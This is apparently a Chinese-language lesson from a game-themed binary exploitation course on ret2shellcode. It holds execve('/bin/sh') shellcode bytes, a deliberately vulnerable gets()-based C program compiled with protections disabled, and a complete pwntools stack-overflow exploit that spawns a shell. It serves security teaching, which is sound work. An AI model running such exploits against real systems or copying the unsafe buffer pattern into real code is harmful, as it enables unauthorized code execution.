# 第 9 关 · ret2shellcode：自己写个作弊码

## 🎬 游戏开场

前两关我们靠"跳到游戏里已有的隐藏关卡"通关。但有一天，你遇到的游戏特别干净——没有任何后门，没有 system 调用，连 `/bin/sh` 字符串都找不到。

这时候你拍桌子：**"那我自己写一个作弊器带进去！"**

这就是 **ret2shellcode**：

1. 你自己写一小段机器码（叫 **shellcode**），功能是"打开一个 shell"。
2. 想办法把它塞进程序内存的某个角落。
3. 把返回地址改成那段代码的地址，让程序去执行它。

游戏比喻：**自带作弊器潜入游戏**。但它有个致命前提——那块内存必须**允许执行代码**（就像游戏得允许你从那儿发起动作）。

---

## 🧠 核心概念（游戏版）

### 1. shellcode 是什么？

shellcode 是一小段**机器指令**（二进制字节），通常是这样：

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

看着像乱码？它就是"控制台指令"的二进制形式，作用是调用系统功能 `execve("/bin/sh")`——打开一个 shell。

好消息：**你不用手写**。pwntools 一行生成：

```python
shellcode = asm(shellcraft.amd64.linux.sh())
```

这就是一段 64 位 Linux 下"开 shell"的现成作弊器。

### 2. shellcode 放哪儿？三个条件

要执行自带代码，存放位置必须满足：

| 条件 | 游戏说法 | 现实 |
| --- | --- | --- |
| 可写 | 你能把代码放进去 | 需要能写入（如 gets 读入） |
| 可执行 | 游戏允许从这发起动作 | 该内存页有执行权限（NX 关闭） |
| 地址已知 | 你知道作弊器藏哪了 | ASLR 关闭，或地址固定 |

**最常见的落点**：

- **栈上**：直接把 shellcode 作为输入的一部分写进去（NX 关掉时可行）。
- **数据区（.bss）**：如果程序让你往全局变量写东西，且该段可执行。

### 3. 完整攻击结构

假设 shellcode 放在 buf 里，栈布局：

```
低地址
  ┌──────────────────┐
  │  shellcode       │ ← 从 buf 开头开始（这就是它的地址）
  │  (约 20-40 字节)  │
  │  填充...         │
  ├──────────────────┤
  │  覆盖 rbp        │
  ├──────────────────┤
  │  返回地址 = buf地址 │ ← 跳回 shellcode 开头！
  └──────────────────┘
高地址
```

payload 长这样：

```python
payload  = shellcode                 # 作弊器本体
payload += b'A' * (offset - len(shellcode))  # 填充到返回地址前
payload += p64(buf_addr)             # 返回地址 = buf 的地址
```

**难点**：怎么知道 `buf_addr`（buf 在内存的地址）？

- gdb 运行程序，`p &buf` 查看。
- 或者用 ` puts(buf)` 之类的输出泄露（如果程序会打印 buf）。
- 要求 ASLR 关闭（`setarch -R` 或 `-no-pie` + 系统 ASLR 关），否则每次地址都变。

### 4. 为什么这招后来"失效"了？

因为现代系统默认开启 **NX**：栈被标记为"不可执行"。你把 shellcode 放在栈上，跳过去时 CPU 会拒绝执行，程序崩溃。

所以 ret2shellcode 主要出现在：

- 教学题（故意 `-z execstack` 关掉 NX）
- 某些特殊场景（可写可执行的内存段）

现实中的题目，更多用第 10、11 关的 **ret2libc / ROP**——不自带代码，而是**借用系统已有的代码**。那是更通用、更强大的流派。

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 自带作弊器 | shellcode |
| 作弊器存放点 | 可写可执行的内存（栈/.bss） |
| 生成作弊器 | `asm(shellcraft.amd64.linux.sh())` |
| 跳到作弊器 | 返回地址 = shellcode 地址 |
| 游戏禁止执行 | NX / DEP 保护 |

**常用 shellcode 生成技巧**：

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# 标准开 shell
sc = shellcraft.amd64.linux.sh()
print(asm(sc))                      # 输出字节
print(disasm(asm(sc)))              # 反汇编看看它干了啥

# 更短的版本（21字节）
sc2 = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))
```

---

## 🎯 闯关任务：自带作弊器通关

写程序（这次故意开一个可执行的栈）：

```c
// shellcode.c
#include <stdio.h>
void vuln() {
    char buf[64];
    puts("输入：");
    gets(buf);
}
int main(){ vuln(); return 0; }
```

```bash
# 关键：-z execstack 关掉NX，-no-pie 固定地址
gcc -g -O0 -fno-stack-protector -no-pie -z execstack shellcode.c -o shellcode
```

**第一步：找 buf 地址**

```bash
gdb ./shellcode
(gdb) break vuln
(gdb) run
(gdb) p &buf
# 输出类似：0x7fffffffe100  ← 记下这个地址
```

**第二步：写 exp**

```python
from pwn import *
context.arch = 'amd64'
p = process('./shellcode')

sc = asm(shellcraft.amd64.linux.sh())
buf_addr = 0x7fffffffe100    # 换成你查到的地址
offset = 72                  # 64字节buf + 8字节rbp

payload  = sc
payload += b'A' * (offset - len(sc))
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

拿到 shell 就通关。

> **注意**：如果失败，八成是 buf 地址不对（ASLR 没关）或偏移不对。用 `setarch $(uname -m) -R ./shellcode` 关掉 ASLR 再试。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| shellcode | 自己写的开 shell 机器码 |
| 生成 | `asm(shellcraft.amd64.linux.sh())` |
| 三个条件 | 可写、可执行、地址已知 |
| 落点 | 栈 / .bss（需 NX 关闭） |
| 局限 | NX 一开就失效 → 转向 ret2libc |

---

## 🎬 下一关预告

**第 10 关 · ret2libc：借用游戏自带的技能库**

自带作弊器被 NX 封杀了。但别忘了，游戏本体还是调用了 `printf`、`puts` 这些函数——它们住在系统的"技能库"（libc）里，而且**天然可执行**。

ret2libc 的思路：**不写代码，直接调用 libc 里的 `system("/bin/sh")`**。

问题是：libc 的地址被 ASLR 随机化了，怎么找？答案是"**先泄露一个 Known 函数的地址，反推出整个 libc 的基地**"——这招叫泄露基址，是本关的核心，也是整个 PWN 最重要的技能之一。

准备好迎接这场硬仗了吗？
